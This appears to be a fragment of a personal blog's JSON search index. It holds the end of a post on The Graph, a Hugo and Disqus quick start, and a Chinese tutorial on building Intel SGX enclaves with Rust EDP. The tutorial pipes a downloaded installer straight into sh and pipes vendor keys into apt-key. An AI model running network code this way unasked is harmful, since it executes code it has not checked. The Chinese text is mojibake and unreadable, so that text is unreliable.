\\n from \\\u0026#34;sgd33\\\u0026#34;.\\\u0026#34;erc20_deposit\\\u0026#34; c\\n where c.block$ \u0026lt;= $1\\n\\n order by \\\u0026#34;id\\\u0026#34;\\n limit 100) c -- binds: [4752680]\u0026#34; } ] } â†’ graph node bug æ–°ç‰ˆæœ¬å·²ä¿®å¾©\nhttps://github.com/graphprotocol/graph-node/issues/3553\ngraph-ts graph-cli ç‰ˆæœ¬ æ¯å€‹ subgraph è¦é¡å¤–å®šç¾©ï¼Œæ¯å€‹ç‰ˆæœ¬å¯èƒ½ä¸ä¸€æ¨£TT\nReference https://thegraph.com/docs/en/about/introduction/ https://github.com/graphprotocol/graph-node https://thegraph.academy/developers/defining-a-subgraph/ ","date":"2022-06-20T00:00:00Z","permalink":"https://ashirleyshe.github.io/p/the-graph-%E5%8D%80%E5%A1%8A%E9%8F%88%E6%95%B8%E6%93%9A%E7%B4%A2%E5%BC%95%E5%8D%94%E8%AD%B0/","title":"The graph - å€å¡Šéˆæ•¸æ“šç´¢å¼•å”è­°"},{"content":"Install 1 brew install hugo Check the version 1 hugo version Create a New Site 1 hugo new site XXX Add Posts 1 hugo new posts/XXX.md Start the Hugo server 1 2 # Draft hugo server -D Navigate to your new site at http://localhost:1313/.\nBuild 1 2 3 hugo -D # or hugo Output will be in ./public/ directory by default.\nAdd Disqus Go to Disqus: https://disqus.com/ Get started -\u0026gt; I want to install Disqus on my site config.yml è¨­å®š disqusShortname 1 2 # Change it to your Disqus shortname before using disqusShortname: xxx æ–°å¢ layouts/partials/disqus.html ä¸¦è²¼ä¸Šï¼š 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 \u0026lt;div id=\u0026#34;disqus_thread\u0026#34;\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;script type=\u0026#34;text/javascript\u0026#34;\u0026gt; (function() { // Don\u0026#39;t ever inject Disqus on localhost--it creates unwanted // discussions from \u0026#39;localhost:1313\u0026#39; on your Disqus account... if (window.location.hostname == \u0026#34;localhost\u0026#34;) return; var dsq = document.createElement(\u0026#39;script\u0026#39;); dsq.type = \u0026#39;text/javascript\u0026#39;; dsq.async = true; var disqus_shortname = \u0026#39;{{ .Site.DisqusShortname }}\u0026#39;; dsq.src = \u0026#39;//\u0026#39; + disqus_shortname + \u0026#39;.disqus.com/embed.js\u0026#39;; (document.getElementsByTagName(\u0026#39;head\u0026#39;)[0] || document.getElementsByTagName(\u0026#39;body\u0026#39;)[0]).appendChild(dsq); })(); \u0026lt;/script\u0026gt; \u0026lt;noscript\u0026gt;Please enable JavaScript to view the \u0026lt;a href=\u0026#34;https://disqus.com/?ref_noscript\u0026#34;\u0026gt;comments powered by Disqus.\u0026lt;/a\u0026gt;\u0026lt;/noscript\u0026gt; \u0026lt;a href=\u0026#34;https://disqus.com/\u0026#34; class=\u0026#34;dsq-brlink\u0026#34;\u0026gt;comments powered by \u0026lt;span class=\u0026#34;logo-disqus\u0026#34;\u0026gt;Disqus\u0026lt;/span\u0026gt;\u0026lt;/a\u0026gt; Reference https://gohugo.io/getting-started/quick-start/ https://gohugo.io/templates/internal/#disqus\n","date":"2021-10-22T00:00:00Z","permalink":"https://ashirleyshe.github.io/p/hugo-quick-start/","title":"Hugo Quick Start"},{"content":"å‰è¨€ Intel Software Guard Extensions(Intel SGX) æä¾›ä»¥ç¡¬é«”ç‚ºåŸºç¤çš„å¯ä¿¡åŸ·è¡Œç’°å¢ƒï¼Œèˆ‡ ARM TrustZone é¡ä¼¼ï¼Œå¯åœ¨è¨˜æ†¶é«”å…§éš”é›¢ç‰¹å®šçš„æ‡‰ç”¨ç¨‹å¼ç¢¼èˆ‡è³‡æ–™ï¼Œä¿è­·éš±å¯†è³‡æ–™ä¸æœƒè¢«æƒ¡æ„ç¨‹å¼æ”»æ“Šæˆ–ç«Šå–ã€‚ å®ƒå…è¨±ç”¨æˆ¶æ–¼è¨˜æ†¶é«”ä¸­å»ºç«‹ç§æœ‰å€åŸŸï¼Œç¨±ç‚ºã€ŒæŒ‡å®šä½å€ç©ºé–“ã€(enclave)ï¼Œç¨‹å¼ç¢¼å¯æ–¼ enclave ä¸­åŸ·è¡Œï¼Œ èˆ‡å…¶ä»–é‹è¡Œåœ¨ç›¸åŒæˆ–æ›´é«˜æ¬Šé™ç´šåˆ¥çš„ç¨‹å¼æœ‰æ•ˆéš”é›¢ã€‚\nIntel SGX \u0026amp; Enclave Intel SGX ç‚ºæ–¼ x86 å¯¦ä½œ enclave çš„ instruction set extensionã€‚ Enclave ç‚ºç¨‹å¼æä¾›äº†ä¸€å€‹å®‰å…¨çš„åŸ·è¡Œç’°å¢ƒï¼Œä¸å—å¤–ç•Œå¹²æ“¾ã€‚ è©²ç’°å¢ƒå»ºç«‹åœ¨ä¸‰å€‹é—œéµé»ä¸Šï¼š\nFully isolated execution é€šå¸¸åœ¨åŸ·è¡Œç¨‹å¼æ™‚ï¼Œæœƒæœ‰å¤§é‡ç¨‹å¼æ¯”ä½ çš„ç¨‹å¼æ“æœ‰æ›´å¤šçš„ç‰¹æ¬Šï¼šåƒæ˜¯ä½œæ¥­ç³»çµ±ç­‰ç­‰ã€‚ä»–å€‘å¯ä»¥å¾è¨˜æ†¶é«”ä¸­è®€å– secretï¼Œåœ¨å…¶ä»–æ©Ÿå™¨ä¸Šå‰µå»ºä½ çš„ç¨‹å¼çš„å‰¯æœ¬ï¼Œä¸¦ä¿®æ”¹ä½ çš„ç¨‹å¼çš„å·¥ä½œæ–¹å¼ã€‚ è€Œåœ¨ enclave ä¸­é‹è¡Œçš„ç¨‹å¼èˆ‡ç³»çµ±çš„å…¶é¤˜éƒ¨åˆ†å®Œå…¨éš”é›¢ã€‚ä¸€æ—¦ enclave è¢«åŠ è¼‰ï¼Œä¿å­˜åœ¨ enclave ä¸­çš„ç¨‹å¼å’Œæ•¸æ“šå°±ä¸æœƒè¢«ä¿®æ”¹ï¼Œåˆå§‹è¨˜æ†¶é«”å…§å®¹ä»£è¡¨ enclave çš„èº«ä»½(identity)ï¼Œå¦‚æœæ›´æ”¹ enclave çš„ç¨‹å¼ï¼Œå…¶èº«ä»½ä¹Ÿæœƒæ›´æ”¹ã€‚\nä½¿ç”¨ Intel SGX çš„æ‡‰ç”¨ç¨‹å¼æœƒåˆ†ç‚ºå…©å€‹éƒ¨åˆ†ï¼š\nå¯ä¿¡éƒ¨åˆ†ï¼ˆTrusted componentï¼‰ï¼šä¹Ÿå°±æ˜¯ enclaveã€‚ ä¸å—ä¿¡ä»»éƒ¨åˆ†ï¼ˆUntrusted componentï¼‰ï¼šé€™æ˜¯æ‡‰ç”¨ç¨‹å¼çš„å…¶é¤˜éƒ¨åˆ†åŠå…¶ä»»ä½•æ¨¡å¡Šã€‚å¾ enclave çš„è§’åº¦ä¾†çœ‹ï¼ŒOS å’Œ VMM è¢«è¦–ç‚ºä¸å—ä¿¡ä»»çš„éƒ¨åˆ†ã€‚ Sealing è³‡æ–™ä¸¦ä¸æœƒæ°¸ä¹…çš„å„²å­˜åœ¨ enclave ä¸­ã€‚ Sealing ç‚ºå°‡æ•¸æ“šåŠ å¯†çš„éç¨‹ï¼Œä»¥ä¾¿å°‡æ•¸æ“šå„²å­˜åœ¨ä¸å—ä¿¡ä»»çš„åœ°æ–¹ã€‚ Enclave æœƒç²å¾—å’Œè‡ªå·±èº«ä»½å’Œ CPU ç›¸é—œçš„å¯†é‘°ï¼Œæ­¤å¯†é‘°ç¨±ç‚ºå¯†å°å¯†é‘°ï¼ˆsealing key)ï¼Œå®ƒå¯ç”¨æ–¼åŠ å¯†æ•¸æ“šï¼ˆsealed blobï¼‰ï¼Œä»¥å¾Œåœ¨å®Œå…¨ç›¸åŒçš„ CPU ä¸Šé‹è¡Œçš„å®Œå…¨ç›¸åŒçš„ enclave ç¨‹å¼å°±èƒ½è§£å¯†æ•¸æ“šã€‚\nè‹¥ç¨‹å¼æ”¹è®Šï¼Œèº«ä»½æœƒæ”¹è®Šï¼Œsealing key ä¹Ÿæœƒä¸åŒã€‚ å¦‚æœç¨‹å¼é‹è¡Œåœ¨ä¸åŒçš„ CPU ä¸Šï¼Œsealing key ä¹Ÿæœƒä¸åŒã€‚\nExample: Obtaining a sealing key Remote attestation é ç«¯è­‰æ˜ç”¨ä¾†ç¢ºå®šé ç«¯ç³»çµ±å®Œæ•´æ€§ï¼Œç¢ºå®šå…¶æ˜¯å¦å¯ä¿¡ã€‚åœ¨ SGX ä¸­ï¼Œenclave å¯ä»¥ä½¿ç”¨é ç«¯è­‰æ˜æä¾›å…¶èº«ä»½åŠå…¶åŸ·è¡Œç’°å¢ƒçš„è­‰æ˜ï¼Œè¡¨ç¤ºç¡¬é«”æœ‰ç¢ºå¯¦ä½¿ç”¨ SGX åŸ·è¡Œç‰¹å®šçš„ enclaveã€‚è©²è­‰æ˜ç‚ºç”± CPU ä½¿ç”¨å…¶ç§é‘°ç°½ç½²çš„æ•¸ä½ç°½ç« ï¼Œæ­¤ç§é‘°åªèƒ½ç”¨æ–¼é ç«¯è­‰æ˜ï¼Œä¸¦å¯ä»¥ä½¿ç”¨å…¬é‘°é©—è­‰ç°½åã€‚\nAttesatation ä¹Ÿæœ‰ local attestationï¼Œå³ç‚ºåœ¨åŒä¸€æ©Ÿå™¨å…©å€‹ enclave äº’ç›¸èªè­‰çš„éç¨‹ã€‚\nExample: Local attestation Rust EDP é¸æ“‡ Rust EDP ä¾†å¯« SGX ç¨‹å¼é‚„æ˜¯å› ç‚ºå¯«èµ·ä¾†æ¯”è¼ƒè¦ªæ°‘ï¼Œå¦å‰‡éœ€è¦å¯«å¯ä¿¡å€è·Ÿä¸å¯ä¿¡å€çš„ç¨‹å¼ï¼Œå¥½éº»ç…©\u0026hellip;\nInstallation å…ˆçœ‹ä¸€ä¸‹ CPU èƒ½ä¸èƒ½æ”¯æ´ Intel SGX: å¦‚ä½•çŸ¥é“æˆ‘çš„ IntelÂ® è™•ç†å™¨æ˜¯å¦æ”¯æ´ IntelÂ® Software Guard Extensions ï¼ˆIntelÂ® SGXï¼‰\nç’°å¢ƒ Ubuntu 18.04 Install Rust 1 curl --proto \u0026#39;=https\u0026#39; --tlsv1.2 -sSf https://sh.rustup.rs | sh 1 2 3 4 5 6 7 1) Proceed with installation (default) 2) Customize installation 3) Cancel installation \u0026gt;2 ... Default toolchain? (stable/beta/nightly/none) nightly Install nightly toolchain 1 rustup default nightly Install EDP components 1 rustup target add x86_64-fortanix-unknown-sgx --toolchain nightly Install SGX driver 1 2 3 echo \u0026#34;deb https://download.fortanix.com/linux/apt xenial main\u0026#34; | sudo tee -a /etc/apt/sources.list.d/fortanix.list \u0026gt;/dev/null curl -sSL \u0026#34;https://download.fortanix.com/linux/apt/fortanix.gpg\u0026#34; | sudo -E apt-key add sudo apt-get update sudo apt-get install intel-sgx-dkms Install AESM service 1 2 3 echo \u0026#34;deb https://download.01.org/intel-sgx/sgx_repo/ubuntu $(lsb_release -cs) main\u0026#34; | sudo tee -a /etc/apt/sources.list.d/intel-sgx.list \u0026gt;/dev/null curl -sSL \u0026#34;https://download.01.org/intel-sgx/sgx_repo/ubuntu/intel-sgx-deb.key\u0026#34; | sudo -E apt-key add sudo apt-get update sudo apt-get install sgx-aesm-service libsgx-aesm-launch-plugin Install Fortanix EDP utilities 1 2 sudo apt-get install pkg-config libssl-dev protobuf-compiler cargo install fortanix-sgx-tools sgxs-tools Configure Cargo integration with Fortanix EDP Create .cargo directory with config file in it, in your $HOME directory with the following content:\n1 2 [target.x86_64-fortanix-unknown-sgx] runner = \u0026#34;ftxsgx-runner-cargo\u0026#34; Check your SGX setup 1 sgx-detect Run your enclave! 1 2 3 cargo new --bin hello-world cd hello-world cargo run --target x86_64-fortanix-unknown-sgx å°±åƒå¯«ä¸€èˆ¬çš„ Rust ç¨‹å¼ï¼Œåªå·®åˆ¥åœ¨ Running æ™‚å€™çš„æŒ‡ä»¤ã€‚\nç›®éŒ„çµæ§‹ 1 2 3 4 5 6 hello-world/ â”œâ”€â”€ Cargo.lock â”œâ”€â”€ Cargo.toml # å¥—ä»¶ç®¡ç† â”œâ”€â”€ src â”‚Â â””â”€â”€ main.rs # ä½ çš„ç¨‹å¼ â””â”€â”€ target Architecture EDP æä¾›äº†ä»‹é¢å»å•Ÿå‹• enclave ä¸¦ç”± encalve å–å¾—è¼¸å‡ºã€‚ enclave-runner è² è²¬åŠ è¼‰ enclaveã€‚\nftxsgx-runner æ˜¯åŸºæ–¼ enclave-runner çš„åŸ·è¡Œæª”ï¼Œä¹Ÿå¯ä»¥è‡ªå·±å¯«ã€‚\nDeployment æˆ‘å€‘éœ€è¦å°‡åŸ·è¡Œæª”è½‰æ›æˆ .sgxs çš„æ ¼å¼ï¼Œå› ç‚ºç·¨è­¯å™¨æ²’è¾¦æ³•ç›´æ¥è¼¸å‡º .sgxs ï¼Œæ‰€ä»¥å…ˆç·¨è­¯å†è½‰æ›éå»ã€‚\nBuild 1 cargo build --target x86_64-fortanix-unknown-sgx SGXS conversion 1 ftxsgx-elf2sgxs myapp --heap-size 0x20000 --stack-size 0x20000 --threads 10 --debug è¦ç‰¹åˆ¥æ³¨æ„ stack size ä»¥åŠ heap size çš„èª¿æ•´ã€‚ å¦‚æœå¤§å°çµ¦å¤ªå°å¯èƒ½æœƒå°è‡´ enclave åœæ­¢é‹è¡Œï¼š\n1 2 Error while executing SGX enclave. Enclave panicked: memory allocation of 590032 bytes failed ä½†å¦‚æœå¤§å°çµ¦å¤ªå¤§ä¹Ÿæœƒå¢åŠ  enclave è¼‰å…¥æ™‚é–“ï¼Œé™ä½æ•ˆç‡ã€‚\nSign enclave åœ¨åŸ·è¡Œå‰æ˜¯å¿…éœ€è¦è¢«ç°½åçš„ã€‚\n1 2 3 4 5 # ä½¿ç”¨ \u0008OpenSSL ç”¢ç”Ÿ signing key: openssl genrsa -3 3072 \u0026gt; my_key.pem # To sign an enclave using sgxs-sign sgxs-sign --key my_key.pem myapp.sgxs myapp.sig -d --xfrm 7/0 --isvprodid 0 --isvsvn 0 Run æ¯å€‹ encalve éƒ½éœ€è¦ä¸€å€‹ runner å»åŸ·è¡Œå®ƒï¼Œé è¨­ä½¿ç”¨ ftxsgx-runnerã€‚\n1 ftxsgx-runner myapp.sgxs ç°½åæ”¾åœ¨èˆ‡ .sgxs åŒå€‹è³‡æ–™å¤¾å³å¯ï¼Œè‹¥ç„¡ä¹Ÿæœƒç”Ÿæˆå‡çš„ç°½åã€‚\nConclusion é‚„æ˜¯æœ‰å¾ˆå¤šç´°ç¯€é‚„æ²’çœ‹ï¼Œé‚„æœ‰ä¹Ÿé‚„æ²’æ¢è¨åˆ°çˆ†å‡ºçš„ä¸€äº›æ¼æ´ã€å®‰å…¨æ€§å•é¡Œã€‚ å°‡ç ”ç©¶åŠ å…¥ Intel SGX æ˜¯æœ‰å¾ˆå¤šç¨®å¯èƒ½æ€§çš„:\nç§é‘°ç®¡ç†ï¼šä½¿ç”¨ enclave ç®¡ç†ç§é‘° èˆ‡å€å¡Šéˆçµåˆï¼šæé«˜å€å¡Šéˆæ‡‰ç”¨çš„å®‰å…¨æ€§ é›»å­ç¡¬é«”éŒ¢åŒ…ï¼šåœ¨æ›´å®‰å…¨çš„ç’°å¢ƒä¸­åŸ·è¡Œè™›æ“¬è²¨å¹£äº¤æ˜“ å¤šæ–¹è¨ˆç®—(Multiparty computation) IoTï¼šæå‡é€šè¨Šå®‰å…¨ Reference Fortanix Rust Enclave Development Platform (github) Fortanix Rust Enclave Development Platform | Rust EDP IntelÂ® Software Guard Extensions Overview of Intel SGX ","date":"2021-08-05T00:00:00Z","permalink":"https://ashirleyshe.github.io/p/%E4%BD%BF%E7%94%A8-rust-edp-%E6%92%B0%E5%AF%AB-intel-sgx-%E7%A8%8B%E5%BC%8F/","title":"ä½¿ç”¨ Rust EDP æ’°å¯« Intel SGX ç¨‹å¼"}]